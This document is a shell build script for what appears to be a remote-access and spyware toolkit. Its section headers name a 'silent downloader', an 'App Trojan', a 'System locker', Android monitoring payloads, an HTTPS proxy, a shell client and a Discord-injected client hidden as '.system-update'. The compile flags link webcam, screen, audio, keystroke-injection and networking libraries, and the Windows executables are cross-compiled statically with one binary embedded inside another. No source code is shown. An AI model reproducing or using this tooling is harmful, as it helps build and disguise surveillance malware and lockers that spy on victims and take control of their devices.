#Build Interpretor executor payload
cd interpretor
g++ -o client client.cpp
#windows compile
x86_64-w64-mingw32-g++ client.cpp -o client.exe \
-lws2_32 -static-libgcc -static-libstdc++

#Build C Payload
gcc -o client hook2.c -lpthread -ldl -lX11 -lXtst -lasound -lcurl `pkg-config --cflags --libs opencv4` `pkg-config --cflags --libs gtk+-3.0`
gcc -o client hook4.c -I/home/zeus/MASH -lpthread -ldl -lX11 -lXtst -lasound -lcurl `pkg-config --cflags --libs opencv4` `pkg-config --cflags --libs gtk+-3.0`
#build command for windows on liinux
x86_64-w64-mingw32-gcc -o hook.exe hook2.c \
  -lws2_32 -liphlpapi -lwlanapi -lsetupapi -lpowrprof -lwinmm \
  -lole32 -lpsapi -luser32 -lgdi32 -ladvapi32 -lshell32 \
  -loleaut32 -lcomctl32 -lwinspool -limm32 -lmsimg32 -lversion \
  -lcomdlg32 -lshlwapi -lstrmiids -lwtsapi32 -pthread -mwindows -static -luuid -ldxva2 -lwinhttp -lurlmon

#Build CPP Payload
g++ -o pentool webview_pen3.cpp \
  -std=c++17 \
  -I./opencv_fix \
  -I/usr/include/opencv4 \
  -L/usr/lib/x86_64-linux-gnu \
  -lopencv_core -lopencv_imgproc -lopencv_imgcodecs -lopencv_highgui -lopencv_videoio \
  -lbluetooth \
  -lportaudio \
  -lssl -lcrypto \
  -lpthread \
  -lX11 -lXtst \
  -lboost_system \
  -lboost_thread \
  -I./webview/include -I./webview2_sdk/build/native/include \
  `pkg-config --cflags --libs gtk+-3.0 webkit2gtk-4.1 libcurl`
#Windows
x86_64-w64-mingw32-g++ -std=c++17 -DWEBVIEW_EDGE=1 \
-I./webview/include -I./webview2_sdk/build/native/include \
-I$HOME/mingw-libs/include \
-I/usr/x86_64-w64-mingw32/include \
-I$HOME/mingw-libs/include/opencv4 \
-I/usr/x86_64-w64-mingw32/include/gdiplus \
webview_pen3.cpp -mwindows -o webview_pen.exe \
-L$HOME/mingw-libs/lib/webview/WebView2LoaderStatic \
-L$HOME/mingw-libs/lib \
-L$HOME/mingw-libs/lib64 \
-L$HOME/mingw-libs/lib/opencv4/3rdparty \
-lopencv_world4130 \
-llibopenjp2 -lIlmImf -lade -llibprotobuf \
-llibwebp -llibjpeg-turbo -llibpng -llibtiff -lzlib \
-lpthread \
-lportaudio.dll \
-lssl -lcrypto \
-lbthprops \
-luser32 -lgdi32 -lcomdlg32 -lole32 -loleaut32 -luuid -lwinmm -limm32 -lws2_32 -lmswsock -liphlpapi \
-lgdiplus \
-lversion -lshlwapi \
-lurlmon \
-static-libgcc -static-libstdc++ \
-D_WIN32 -D_WIN32_WINNT=0x0600 \
-DWIN32_LEAN_AND_MEAN

#Build silent downloader
g++ -o download download.cpp

x86_64-w64-mingw32-g++ download.cpp -o download \
  -lwininet -lole32 -lshell32 \
  -static-libgcc -static-libstdc++

#Build App Trojan
g++ -o pentool webview_pen3.cpp \
  -std=c++17 \
  -I./opencv_fix \
  -I/usr/include/opencv4 \
  -L/usr/lib/x86_64-linux-gnu \
  -lopencv_core -lopencv_imgproc -lopencv_imgcodecs -lopencv_highgui -lopencv_videoio \
  -lbluetooth \
  -lportaudio \
  -lssl -lcrypto \
  -lpthread \
  -lX11 -lXtst \
  -lboost_system \
  -lboost_thread \
  -I./webview/include -I./webview2_sdk/build/native/include \
  `pkg-config --cflags --libs gtk+-3.0 webkit2gtk-4.1 libcurl`
#Windows
x86_64-w64-mingw32-g++ -std=c++17 -DWEBVIEW_EDGE=1 \
-I./webview/include -I./webview2_sdk/build/native/include \
-I$HOME/mingw-libs/include \
-I/usr/x86_64-w64-mingw32/include \
-I$HOME/mingw-libs/include/opencv4 \
-I/usr/x86_64-w64-mingw32/include/gdiplus \
webview_pen3.cpp -mwindows -o webview_pen.exe \
-L$HOME/mingw-libs/lib/webview/WebView2LoaderStatic \
-L$HOME/mingw-libs/lib \
-L$HOME/mingw-libs/lib64 \
-L$HOME/mingw-libs/lib/opencv4/3rdparty \
-lopencv_world4130 \
-llibopenjp2 -lIlmImf -lade -llibprotobuf \
-llibwebp -llibjpeg-turbo -llibpng -llibtiff -lzlib \
-lpthread \
-lportaudio.dll \
-lssl -lcrypto \
-lbthprops \
-luser32 -lgdi32 -lcomdlg32 -lole32 -loleaut32 -luuid -lwinmm -limm32 -lws2_32 -lmswsock -liphlpapi \
-lgdiplus \
-lversion -lshlwapi \
-lurlmon \
-static-libgcc -static-libstdc++ \
-D_WIN32 -D_WIN32_WINNT=0x0600 \
-DWIN32_LEAN_AND_MEAN

g++ -o pentool webview_pen3.cpp \
  -std=c++17 \
  -I./opencv_fix \
  -I/usr/include/opencv4 \
  -L/usr/lib/x86_64-linux-gnu \
  -lopencv_core -lopencv_imgproc -lopencv_imgcodecs -lopencv_highgui -lopencv_videoio \
  -lbluetooth \
  -lportaudio \
  -lssl -lcrypto \
  -lpthread \
  -lX11 -lXtst \
  -lboost_system \
  -lboost_thread \
  -I./webview/include -I./webview2_sdk/build/native/include \
  `pkg-config --cflags --libs gtk+-3.0 webkit2gtk-4.1 libcurl`

x86_64-w64-mingw32-g++ -std=c++17 -DWEBVIEW_EDGE=1 \
-I./webview/include -I./webview2_sdk/build/native/include \
-I$HOME/mingw-libs/include \
-I/usr/x86_64-w64-mingw32/include \
-I$HOME/mingw-libs/include/opencv4 \
-I/usr/x86_64-w64-mingw32/include/gdiplus \
webview_pen3.cpp -o webview_pen.exe \
-L$HOME/mingw-libs/lib/webview/WebView2LoaderStatic \
-L$HOME/mingw-libs/lib \
-L$HOME/mingw-libs/lib64 \
-L$HOME/mingw-libs/lib/opencv4/3rdparty \
-lopencv_world4130 \
-llibopenjp2 -lIlmImf -lade -llibprotobuf \
-llibwebp -llibjpeg-turbo -llibpng -llibtiff -lzlib \
-lpthread \
-lportaudio.dll \
-lssl -lcrypto \
-lbthprops \
-luser32 -lgdi32 -lcomdlg32 -lole32 -loleaut32 -luuid -lwinmm -limm32 -lws2_32 -lmswsock -liphlpapi \
-lgdiplus \
-lversion -lshlwapi \
-lurlmon \
-lwinhttp \
-static-libgcc -static-libstdc++ \
-D_WIN32 -D_WIN32_WINNT=0x0600 \
-DWIN32_LEAN_AND_MEAN

#to compile with a new icon
x86_64-w64-mingw32-windres app_icon.rc -O coff -o app_icon.res

#Build Java Payload
cd java
cd MegaClient
jar cfm MegaClient.jar manifest.txt *.class
javac MegaClient.java
java -jar MegaClient.jar
cd ..
cd ..

#Build Java Game Payload
cd java
cd GameClient
jar cfm GameClient.jar manifest.txt *.class
javac GameClient.java
java -jar GameClient.jar
cd ..
cd ..

#Build J2ME Payload
#Implementation Soon...

#Stagnography
#Implementation Soon...

#System locker
cd Locker
x86_64-w64-mingw32-g++ -g -o SystemLocker.exe syslock.cpp -mwindows -lshlwapi -lshell32 -ladvapi32 -lgdi32 -luser32 -lkernel32 -static -DUNICODE -D_UNICODE
cd ..

#Build Image Payload
cd MOD
cd Monitor
sed -i "s|/home/[^/]*/Android/Sdk|/home/$(whoami)/Android/Sdk|" local.properties
chmod +x gradlew
./gradlew clean
./gradlew build                          
./gradlew assembleDebug

#Build Webview p'ayload
cd MOD
cd Monitor2
sed -i "s|/home/[^/]*/Android/Sdk|/home/$(whoami)/Android/Sdk|" local.properties
chmod +x gradlew
./gradlew clean
./gradlew build                          
./gradlew assembleDebug

#Build Android Payload
cd MOD
cd Monitor3
sed -i "s|/home/[^/]*/Android/Sdk|/home/$(whoami)/Android/Sdk|" local.properties
chmod +x gradlew
./gradlew clean
./gradlew build                          
./gradlew assembleDebug

#Build Android HTTPS proxy
cd MOD
cd websession
sed -i "s|/home/[^/]*/Android/Sdk|/home/$(whoami)/Android/Sdk|" local.properties
chmod +x gradlew
./gradlew clean
./gradlew build                          
./gradlew assembleDebug

#Build android live screen payload
cd MOD
cd websession
sed -i "s|/home/[^/]*/Android/Sdk|/home/$(whoami)/Android/Sdk|" local.properties
chmod +x gradlew
./gradlew clean
./gradlew build                          
./gradlew assembleDebug

g++ -std=c++17 -o file_explorer file_explorer2.cpp geo_combined.o \
    -I/usr/local/include \
    -I/usr/include \
    -I/usr/include/opencv4 \
    -pthread \
    -lboost_system \
    -lboost_thread \
    -lboost_random \
    -lopencv_core \
    -lopencv_imgcodecs \
    -lopencv_imgproc \
    -lopencv_highgui \
    -lopencv_videoio \
    -lX11 \
    -lXrandr \
    -lpulse \
    -lcurl \
    -lssl \
    -lcrypto \
    -ludev \
    -lpcap \
    -O2
    ./file_explorer

x86_64-w64-mingw32-g++ -c geo.cpp -o geo_win.o -std=c++17
x86_64-w64-mingw32-ld -r geo_win.o chrome-win.o chromedriver-win.o -o geo_combined_win.o
x86_64-w64-mingw32-g++ file_explorer2.cpp geo_combined_win.o yourapp.o -o client.exe \
    -std=c++17 \
    -I/home/mik3/mingw-libs2/include/opencv4 \
    -I/home/mik3/mingw-libs2/include \
    -L/home/mik3/mingw-libs2/lib \
    -L/home/mik3/mingw-libs2/lib64 \
    -L/home/mik3/mingw-libs2/lib/opencv4/3rdparty \
    -static \
    -lopencv_videoio4130 -lopencv_video4130 -lopencv_imgcodecs4130 \
    -lopencv_imgproc4130 -lopencv_highgui4130 -lopencv_core4130 \
    -llibtiff -llibwebp -lwebp -llibpng -llibjpeg-turbo \
    -lIlmImf -llibopenjp2 -lade -llibprotobuf \
    -lzlib \
    -lssl -lcrypto \
    -lgdiplus \
    -lpthread \
    -lws2_32 -lgdi32 -luser32 -lshell32 -lole32 -loleaut32 -luuid \
    -lwinmm -lstrmiids -lvfw32 -lmfplat -lmfuuid -lcomdlg32 -lcrypt32 \
    -lsetupapi -ladvapi32 \
    -lwtsapi32 -luserenv \
    -liphlpapi

objcopy -I binary -O elf64-x86-64 -B i386:x86-64 yourapp.exe yourapp.o

x86_64-w64-mingw32-g++ gshell.cpp -o client -lws2_32 -liphlpapi

g++ gshell.cpp -o client -lpthread

x86_64-w64-mingw32-g++ audio_client.cpp -o audio_client.exe \
    -std=c++17 \
    -I/home/mik3/mingw-libs2/include \
    -L/home/mik3/mingw-libs2/lib \
    -L/home/mik3/mingw-libs2/lib64 \
    -static \
    -lssl -lcrypto \
    -lpthread \
    -lws2_32 -lole32 -loleaut32 -luuid \
    -lwinmm -lksuser \
    -DUNICODE -D_UNICODE

x86_64-w64-mingw32-g++ audio_client.cpp -o audio_client.exe \
    -std=c++17 \
    -I/home/mik3/mingw-libs2/include \
    -L/home/mik3/mingw-libs2/lib \
    -L/home/mik3/mingw-libs2/lib64 \
    -static \
    -lportaudio \
    -lssl -lcrypto \
    -lpthread \
    -lws2_32 -lgdi32 -luser32 -lshell32 -lole32 -loleaut32 -luuid \
    -lwinmm -lstrmiids -lvfw32 -lmfplat -lmfuuid -lcomdlg32 -lcrypt32 \
    -lsetupapi -ladvapi32 \
    -lwtsapi32 -luserenv \
    -liphlpapi

# Clean previous builds
rm -rf build dist bot.spec

# Get the Python path from virtual environment
PYTHON_PATH=$(python3 -c "import sys; print(':'.join(sys.path))")

# Build with maximum inclusion
pyinstaller --onefile \
  --paths "$PYTHON_PATH" \
  --hidden-import discord \
  --hidden-import discord.ext.commands \
  --hidden-import discord.ext.tasks \
  --hidden-import discord.ext \
  --hidden-import discord.ui \
  --hidden-import discord.abc \
  --hidden-import discord.state \
  --hidden-import discord.gateway \
  --hidden-import discord.http \
  --hidden-import discord.client \
  --hidden-import discord.user \
  --hidden-import discord.channel \
  --hidden-import discord.guild \
  --hidden-import discord.message \
  --hidden-import discord.embeds \
  --hidden-import discord.enums \
  --hidden-import discord.file \
  --hidden-import discord.errors \
  --hidden-import discord.member \
  --hidden-import discord.role \
  --hidden-import discord.team \
  --hidden-import discord.webhook \
  --hidden-import discord.widget \
  --hidden-import discord.invite \
  --hidden-import discord.audit_logs \
  --hidden-import discord.sticker \
  --hidden-import discord.app_commands \
  --hidden-import discord.app_commands.commands \
  --hidden-import discord.app_commands.namespace \
  --hidden-import discord.app_commands.models \
  --hidden-import aiohttp \
  --hidden-import aiohttp.client \
  --hidden-import aiohttp.client_reqrep \
  --hidden-import aiohttp.helpers \
  --hidden-import aiohttp.http \
  --hidden-import aiohttp.http_parser \
  --hidden-import aiohttp.web \
  --hidden-import aiohttp.web_server \
  --hidden-import aiohttp.web_app \
  --hidden-import aiohttp.web_routedef \
  --hidden-import aiohttp.payload \
  --hidden-import aiohttp.payload_streamer \
  --hidden-import aiohttp.multipart \
  --hidden-import aiohttp.streams \
  --hidden-import aiohttp.signals \
  --hidden-import aiohttp.connector \
  --hidden-import aiohttp.client_proto \
  --hidden-import multidict \
  --hidden-import yarl \
  --hidden-import attr \
  --hidden-import idna \
  --hidden-import idna.core \
  --hidden-import idna.idnadata \
  --hidden-import idna.intranges \
  --hidden-import idna.uts46data \
  --hidden-import chardet \
  --hidden-import charset_normalizer \
  --hidden-import certifi \
  --hidden-import urllib3 \
  --hidden-import requests \
  --collect-all discord \
  --collect-all aiohttp \
  --collect-all multidict \
  --collect-all yarl \
  --noupx \
  bot.py

echo "Build complete! Check the dist directory."

# Clean previous builds
rm -rf build dist

# Build with data files included
pyinstaller --onefile \
  --add-data "index.html:." \
  --paths /home/mik3/PMP/venv/lib/python3.13/site-packages \
  --hidden-import websockets \
  --hidden-import websockets.legacy \
  --hidden-import websockets.legacy.client \
  --hidden-import websockets.legacy.server \
  --hidden-import websockets.legacy.protocol \
  --hidden-import websockets.connection \
  --hidden-import websockets.frames \
  --hidden-import websockets.http \
  --hidden-import websockets.streams \
  --hidden-import websockets.uri \
  --hidden-import websockets.version \
  --hidden-import websockets.sync \
  --hidden-import websockets.sync.client \
  --hidden-import websockets.sync.server \
  --collect-all websockets \
  server.py

pkill -f discord_client_injected
pkill -f system-update
rm -f /home/mik3/.config/.system-update/system-update

g++ main.cpp -o discord_client \
    -std=c++17 \
    -I/usr/include/opencv4 \
    -lopencv_core -lopencv_imgcodecs -lopencv_imgproc -lopencv_highgui -lopencv_videoio \
    -lcurl -lssl -lcrypto -lpthread \
    -lboost_system -lboost_random -lboost_json \
    -lportaudio -lsndfile \
    -lX11 -lXrandr -lXext

x86_64-w64-mingw32-g++ main.cpp -o discord_client.exe \
    -std=c++17 \
    -static -static-libgcc -static-libstdc++ \
    -Wl,-Bstatic \
    -I/home/mik3/mingw-libs2/include/opencv4 \
    -I/home/mik3/mingw-libs2/include \
    -L/home/mik3/mingw-libs2/lib \
    -L/home/mik3/mingw-libs2/lib64 \
    -L/home/mik3/mingw-libs2/lib/opencv4/3rdparty \
    -L/usr/lib/gcc/x86_64-w64-mingw32/15-win32 \
    -L/usr/x86_64-w64-mingw32/lib \
    -Wl,--start-group \
    -lopencv_videoio4130 -lopencv_video4130 -lopencv_imgcodecs4130 \
    -lopencv_imgproc4130 -lopencv_highgui4130 -lopencv_core4130 \
    -llibtiff -llibwebp -lwebp -llibpng -llibjpeg-turbo \
    -lIlmImf -llibopenjp2 -lade -llibprotobuf \
    -lzlib \
    -lssl -lcrypto \
    -lgdiplus \
    -l:libboost_atomic-gcc15-mt-x64-1_90.a \
    -l:libboost_chrono-gcc15-mt-x64-1_90.a \
    -l:libboost_thread-gcc15-mt-x64-1_90.a \
    -l:libboost_random-gcc15-mt-x64-1_90.a \
    -l:libboost_json-gcc15-mt-x64-1_90.a \
    -lportaudio \
    -lsndfile \
    -lmpg123 -lmp3lame -lopus -lvorbis -lvorbisenc -lvorbisfile -logg -lFLAC \
    -l:libstdc++.a \
    -l:libmingwthrd.a \
    -l:libpthread.a \
    -l:libwinpthread.a \
    -Wl,--end-group \
    -Wl,-Bdynamic \
    -lwinmm -lole32 -loleaut32 -luuid -lshlwapi -lws2_32 \
    -lgdi32 -luser32 -lshell32 -lcomdlg32 -lcrypt32 \
    -lsetupapi -ladvapi32 -lwtsapi32 -luserenv \
    -liphlpapi -lwinhttp -lstrmiids -lvfw32 -lmfplat -lmfuuid

x86_64-w64-mingw32-g++ main.cpp -o discord_client.exe \
    -std=c++17 \
    -I/home/mik3/mingw-libs2/include \
    -I/home/mik3/mingw-libs2/include/opencv4 \
    -L/home/mik3/mingw-libs2/lib \
    -static \
    -lopencv_videoio4130 -lopencv_video4130 -lopencv_imgcodecs4130 \
    -lopencv_imgproc4130 -lopencv_highgui4130 -lopencv_core4130 \
    -llibtiff -llibwebp -lwebp -llibpng -llibjpeg-turbo \
    -lIlmImf -llibopenjp2 -lade -llibprotobuf -lzlib \
    -lssl -lcrypto -lgdiplus -lpthread -lws2_32 -lgdi32 \
    -luser32 -lshell32 -lole32 -loleaut32 -luuid -lwinmm \
    -lstrmiids -lvfw32 -lmfplat -lmfuuid -lcomdlg32 -lcrypt32 \
    -lsetupapi -ladvapi32 -lwtsapi32 -luserenv -liphlpapi \
    -lportaudio -lsndfile
